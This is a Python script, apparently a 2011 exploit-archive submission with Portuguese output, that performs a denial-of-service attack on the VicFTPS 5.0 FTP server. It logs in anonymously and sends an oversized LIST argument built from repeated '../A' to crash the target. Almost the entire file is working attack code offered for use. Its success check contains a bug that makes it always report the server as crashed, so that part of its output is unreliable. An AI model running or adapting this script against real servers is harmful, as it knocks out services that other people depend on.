#!/usr/bin/python
#
#
#       xxx     xxx        xxxxxxxxxxx        xxxxxxxxxxx        xxxxxxxxxxx
#        xxx   xxx        xxxxxxxxxxxxx      xxxxxxxxxxxxx      xxxxxxxxxxxxx  
#         xxx xxx         xxxxxxxxxxxxx      xxxxxxxxxxxxx      xxxxxxxxxxxxx                    
#          xxxxx          xxx       xxx      xxx       xxx      xxx       xxx           xxxxxx   
#           xxx           xxx       xxx      xxx       xxx      xxx       xxx          xxxxxxxx  xxxxxxxx  xxxxxxxxx
#         xxxxxx          xxx       xxx      xxx       xxx      xxx       xxx          xx    xx  xx    xx  xx
#        xxx  xxx         xxx       xxx      xxx       xxx      xxx       xxx          xx    xx  xx xxxx   xx  xxxxx
#      xxx     xxx        xxxxxxxxxxxxx      xxxxxxxxxxxxx      xxxxxxxxxxxxx   xxx    xxxxxxxx  xx   xx   xx     xx
#     xxx       xxx        xxxxxxxxxxx        xxxxxxxxxxx        xxxxxxxxxxx    xxx     xxxxxx   xx    xx  xxxxxxxxx
#
#
#[+]Exploit Title: Exploit Denial of Service VicFTPS
#[+]Date: 02\24\11
#[+]Author C4SS!0 G0M3S
#[+]Software Link: http://vicftps.50webs.com/VicFTPS-5.0-bin.zip
#[+]Version: 5.0
#[+]Tested On: WIN-XP SP3
#[+]CVE: N/A
#[+]Language: Portuguese
#
#
#Author C4SS!0 G0M3S || Cassio Gomes
#E-mail Louredo_@hotmail.com
#Site www.x000.org/
#
#


import socket
import time
import os
import sys

if os.name == 'nt':
    os.system("cls")#SE FOR WINDOWS
    os.system("color 4f")
else:
    os.system("clear")#SE FOR LINUX


def usage():
    print """
          ============================================================
          ============================================================
          ===============Exploit Denial of Service Vicftps 5.0========
          ===============Autor C4SS!0 G0M3S || C\xe1ssio Gomes==========
          ===============E-mail Louredo_@hotmail.com==================
          ===============Site www.x000.org/===========================
          ============================================================
          ============================================================
"""
         

if len(sys.argv)!=3:
    usage()
    print "\t\t[-]Modo de Uso: python %s <Host> <Porta>" % sys.argv[0]
    print "\t\t[-]Exemplo: python %s 192.168.1.2 21" % sys.argv[0]
    sys.exit(0)
buf = "../A" * (330/4)
usage()
print "\t\t[+]Conectando-se Ao Servidor %s\n" % sys.argv[1]
time.sleep(1)
try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((sys.argv[1],int(sys.argv[2])))
    print "\t\t[+]Checando se o Servidor e Vulneravel\n"
    time.sleep(1)
    banner = s.recv(2000)
    if((banner.find("VicFTPS"))!=-1):
        print "\t\t[+]Servidor e Vulneravel:)\n"
        time.sleep(1)
    else:
        print "\t\t[+]Sinto Muito, Servidor Nao e Vulneravel:(\n"
        time.sleep(1)
    print "\t\t[+]Enviando Exploit Denial of Service\n"
    time.sleep(1)
    
    s.send("USER anonymous\r\n")
    s.recv(2000)
    s.send("PASS\r\n")  
    s.recv(2000)
    s.send("LIST "+buf+"\r\n")
    print "\t\t[+]Exploit Enviado Com Sucesso ao Servidor "+sys.argv[1]+"\n"
    time.sleep(1)
    print "\t\t[+]Checando Se o Exploit Funcionou\n"
    time.sleep(1)
    try:
       sock = socket.socket(socket.AF_INET,sock.SOCK_STREAM)
       s.connect((sys.argv[1],int(sys.argv[2])))
       print "\t\t[+]Sinto Muito o Exploit Nao Funcionou:(\n"
       time.sleep(1) 
       sys.exit(0)
    except:
        print "\t\t[+]Exploit Funcionou, Servidor Derrubado:)\n"
        time.sleep(1)
    
    
except:
    print "\t\t[+]Erro ao Se Conectar no Servidor "+sys.argv[1]+" Na Porta "+sys.argv[2]+"\n"